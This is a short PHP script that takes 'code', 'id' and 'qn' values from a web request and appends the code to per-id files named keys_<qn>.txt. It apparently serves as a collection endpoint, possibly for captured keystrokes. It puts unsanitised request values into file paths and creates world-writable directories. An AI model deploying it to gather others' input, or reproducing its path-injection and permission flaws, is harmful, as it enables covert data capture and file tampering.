<?php
$code = $_GET['code'];
$id=$_GET['id'];
$qn=$_GET['qn'];
$Info = array();
$Info['msg']="i recieved ".$code." from".$id;

 $txt = $code;
 if (is_dir('logs/'.$id)) {
 $myfile = file_put_contents('logs/'.$id.'/keys_'.$qn.'.txt', $txt.PHP_EOL , FILE_APPEND | LOCK_EX);
 echo json_encode($Info);
 }else{
mkdir('logs/'.$id,0777,true);
 $myfile = file_put_contents('logs/'.$id.'/keys_'.$qn.'.txt', $txt.PHP_EOL , FILE_APPEND | LOCK_EX);
 echo json_encode($Info); 	
 }
 


